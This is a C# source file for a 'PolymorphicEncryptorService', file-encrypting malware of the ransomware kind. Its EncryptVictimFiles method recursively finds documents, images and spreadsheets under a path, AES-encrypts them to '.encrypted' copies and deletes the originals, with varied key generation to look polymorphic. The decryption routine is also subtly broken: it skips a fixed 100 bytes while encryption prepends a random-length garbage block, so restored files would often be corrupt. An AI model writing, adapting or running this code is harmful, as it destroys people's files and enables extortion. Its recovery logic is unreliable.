using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Linq;

namespace CP.Services
{
    public class PolymorphicEncryptorService
    {
        private Random _random;
        private string[] _targetExtensions;

        public PolymorphicEncryptorService()
        {
            _random = new Random();
            _targetExtensions = new[] { ".txt", ".doc", ".docx", ".pdf", ".jpg", ".png", ".xlsx" };
        }

        public string GeneratePolymorphicKey()
        {
            switch (_random.Next(0, 4))
            {
                case 0: return GenerateBase64Key();
                case 1: return GenerateGuidKey();
                case 2: return GenerateHashKey();
                case 3: return GenerateRandomKey();
                default: return GenerateBase64Key();
            }
        }

        public int EncryptVictimFiles(string basePath, string encryptionKey)
        {
            int encryptedCount = 0;

            foreach (var extension in _targetExtensions)
            {
                try
                {
                    var files = Directory.GetFiles(basePath, $"*{extension}", SearchOption.AllDirectories);
                    foreach (var file in files)
                    {
                        try
                        {
                            if (EncryptFile(file, encryptionKey))
                                encryptedCount++;
                        }
                        catch { continue; }
                    }
                }
                catch { continue; }
            }

            return encryptedCount;
        }

        public int DecryptVictimFiles(string basePath, string encryptionKey)
        {
            int decryptedCount = 0;
            try
            {
                var encryptedFiles = Directory.GetFiles(basePath, "*.encrypted", SearchOption.AllDirectories);

                foreach (var file in encryptedFiles)
                {
                    try
                    {
                        if (DecryptFile(file, encryptionKey))
                            decryptedCount++;
                    }
                    catch { continue; }
                }
            }
            catch { }

            return decryptedCount;
        }

        private bool EncryptFile(string filePath, string key)
        {
            try
            {
                byte[] fileBytes = File.ReadAllBytes(filePath);
                byte[] encryptedBytes = PolymorphicEncrypt(fileBytes, key);

                File.WriteAllBytes(filePath + ".encrypted", encryptedBytes);
                File.Delete(filePath);

                return true;
            }
            catch
            {
                return false;
            }
        }

        private bool DecryptFile(string filePath, string key)
        {
            try
            {
                byte[] encryptedBytes = File.ReadAllBytes(filePath);
                byte[] decryptedBytes = PolymorphicDecrypt(encryptedBytes, key);

                string originalPath = filePath.Replace(".encrypted", "");
                File.WriteAllBytes(originalPath, decryptedBytes);
                File.Delete(filePath);

                return true;
            }
            catch
            {
                return false;
            }
        }

        private byte[] PolymorphicEncrypt(byte[] data, string key)
        {
            using (Aes aes = Aes.Create())
            {
                byte[] keyBytes = DeriveKey(key, aes.KeySize / 8);
                byte[] ivBytes = DeriveKey(key + "IV", aes.BlockSize / 8);

                aes.Key = keyBytes;
                aes.IV = ivBytes;

                using (var encryptor = aes.CreateEncryptor())
                using (var ms = new MemoryStream())
                {
                    if (_random.Next(0, 2) == 0)
                    {
                        byte[] garbage = new byte[_random.Next(10, 100)];
                        _random.NextBytes(garbage);
                        ms.Write(garbage, 0, garbage.Length);
                    }

                    using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        cs.Write(data, 0, data.Length);
                        cs.FlushFinalBlock();
                    }

                    return ms.ToArray();
                }
            }
        }

        private byte[] PolymorphicDecrypt(byte[] data, string key)
        {
            using (Aes aes = Aes.Create())
            {
                byte[] keyBytes = DeriveKey(key, aes.KeySize / 8);
                byte[] ivBytes = DeriveKey(key + "IV", aes.BlockSize / 8);

                aes.Key = keyBytes;
                aes.IV = ivBytes;

                using (var decryptor = aes.CreateDecryptor())
                using (var ms = new MemoryStream(data))
                {
                    if (data.Length > 100)
                        ms.Position = 100;

                    using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                    using (var result = new MemoryStream())
                    {
                        cs.CopyTo(result);
                        return result.ToArray();
                    }
                }
            }
        }

        private byte[] DeriveKey(string password, int keySize)
        {
            using (var deriveBytes = new Rfc2898DeriveBytes(password,
                   Encoding.UTF8.GetBytes("FixedSaltForDemo"), 1000))
            {
                return deriveBytes.GetBytes(keySize);
            }
        }

        private string GenerateBase64Key()
        {
            byte[] key = new byte[32];
            using (var rng = new RNGCryptoServiceProvider())
                rng.GetBytes(key);
            return Convert.ToBase64String(key);
        }

        private string GenerateGuidKey()
        {
            return Guid.NewGuid().ToString("N") + Guid.NewGuid().ToString("N");
        }

        private string GenerateHashKey()
        {
            using (var sha256 = SHA256.Create())
            {
                byte[] data = new byte[100];
                new RNGCryptoServiceProvider().GetBytes(data);
                byte[] hash = sha256.ComputeHash(data);
                return BitConverter.ToString(hash).Replace("-", "");
            }
        }

        private string GenerateRandomKey()
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
            return new string(Enumerable.Repeat(chars, 64)
                .Select(s => s[_random.Next(s.Length)]).ToArray());
        }
    }
}